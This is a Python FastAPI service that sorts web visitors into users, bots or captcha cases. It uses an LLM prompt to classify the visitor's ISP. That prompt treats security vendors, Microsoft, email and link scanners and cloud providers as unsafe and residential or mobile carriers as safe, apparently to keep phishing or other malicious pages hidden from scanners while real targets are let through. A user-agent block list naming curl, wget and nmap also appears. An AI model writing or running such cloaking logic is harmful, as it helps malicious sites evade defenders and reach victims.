import os
from fastapi import FastAPI
from pydantic import BaseModel
from typing import Optional
import re
import logging
from huggingface_hub import InferenceClient

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

app = FastAPI()

HF_TOKEN = os.getenv("HF_TOKEN", "")
MODEL_NAME = "deepseek-ai/DeepSeek-R1-0528-Qwen3-8B"

class AICheckRequest(BaseModel):
    ua: Optional[str] = ""
    supportsCookies: Optional[bool] = None
    jsEnabled: Optional[bool] = None
    screenRes: Optional[str] = ""
    lang: Optional[str] = ""
    timezone: Optional[str] = ""
    headers: Optional[dict] = {}
    fingerprint: Optional[dict] = None
    isp: Optional[str] = ""
    isBotUserAgent: Optional[bool] = False
    isScraperISP: Optional[bool] = False
    isIPAbuser: Optional[bool] = False
    isSuspiciousTraffic: Optional[bool] = False
    isDataCenterASN: Optional[bool] = False

@app.get("/")
async def health():
    return {"status": "ok", "model": MODEL_NAME}

def research_isp_with_llm(isp: str) -> tuple[str, str]:
    """
    Classify ISP into [safe], [unsafe], or [verification] categories.
    Returns (classification, full_reasoning).
    """
    if not isp or not HF_TOKEN:
        return "", "No ISP or HF_TOKEN provided"

    messages = [
        {
            "role": "system",
            "content": """You are an advanced network classifier with these absolute rules:

1. SAFE NETWORKS ([safe] tag):
   - Residential ISPs (Comcast, Rogers, MTN, Airtel)
   - Mobile carriers (Verizon, Vodafone, T-Mobile)
   - WiFi service providers
   - SIM card networks

2. UNSAFE NETWORKS ([unsafe] tag):
   - Microsoft services/subsidiaries (Azure, LinkedIn, GitHub)
   - Security platforms (Fortinet, Proofpoint, Zscaler)
   - Email/link scanning services
   - Cloud providers (AWS, Google Cloud)
   - Scrapers/proxies (BrightData, Oxylabs)
   - Known abusive networks

3. VERIFICATION REQUIRED ([verification] tag):
   - Residential ISPs with suspicious activity
   - Unknown networks not matching safe/unsafe
   - Borderline cases needing human review

Output format:
Analysis: <step-by-step reasoning>
Conclusion: [safe|unsafe|verification]"""
        },
        {
            "role": "user",
            "content": f"""Classify this ISP with strict rule adherence:
ISP: {isp}

Provide analysis showing how each rule applies, then your conclusion tag."""
        }
    ]

    try:
        client = InferenceClient(token=HF_TOKEN)
        response = client.chat_completion(
            messages=messages,
            model=MODEL_NAME,
            max_tokens=250,
            temperature=0.1,
            stop_sequences=["\n"]
        )
        
        reasoning = response.choices[0].message.content
        logger.info(f"ISP classification for '{isp}':\n{reasoning}")

        # Extract the conclusion tag
        tags = re.findall(
            r"\[(safe|unsafe|verification)\]",
            reasoning.lower()
        )
        classification = tags[-1] if tags else "verification"
        
        return classification, reasoning

    except Exception as e:
        error_msg = f"Classification Error: {str(e)}"
        logger.error(error_msg)
        return "verification", error_msg

@app.post("/ai-decision")
async def ai_decision(data: AICheckRequest):
    details = data.dict()
    logger.info(f"Request received: {details}")

    # 1. Cloudflare flags - immediate unsafe detection
    cloudflare_flags = {
        "isBotUserAgent": data.isBotUserAgent,
        "isScraperISP": data.isScraperISP,
        "isIPAbuser": data.isIPAbuser,
        "isSuspiciousTraffic": data.isSuspiciousTraffic,
        "isDataCenterASN": data.isDataCenterASN
    }
    
    # 2. ISP analysis
    isp_classification = "safe"  # Default to safe if no ISP provided
    reasoning = "No ISP provided"
    
    if data.isp:
        isp_classification, reasoning = research_isp_with_llm(data.isp)
    
    # Determine final verdict based on all factors
    if (any(cloudflare_flags.values()) or 
        isp_classification == "unsafe"):
        return {
            "verdict": "bot",
            "reason": "Unsafe network detected",
            "details": details,
            "ai_reasoning": reasoning
        }
    elif (isp_classification == "verification" or
          len(data.ua or "") < 20 or
          data.screenRes in {"0x0", "1x1"} or
          data.lang not in {"en-US", "en-CA", "en", "fr", "es", "de", "fr-CA", "ja-JP"}):
        return {
            "verdict": "captcha",
            "reason": "Verification required",
            "details": details,
            "ai_reasoning": reasoning
        }
    
    # 3. Browser checks
    ua = (data.ua or "").lower()
    bot_indicators = {
        "bot", "curl", "python", "wget", "scrapy",
        "headless", "phantom", "selenium", "spider",
        "zgrab", "nmap", "masscan"
    }
    
    if (not data.jsEnabled or 
        not data.supportsCookies or 
        any(ind in ua for ind in bot_indicators)):
        return {
            "verdict": "bot",
            "reason": "Automation detected",
            "details": details
        }

    # 4. Verified safe user
    return {
        "verdict": "user",
        "reason": "All checks passed",
        "details": details
    }
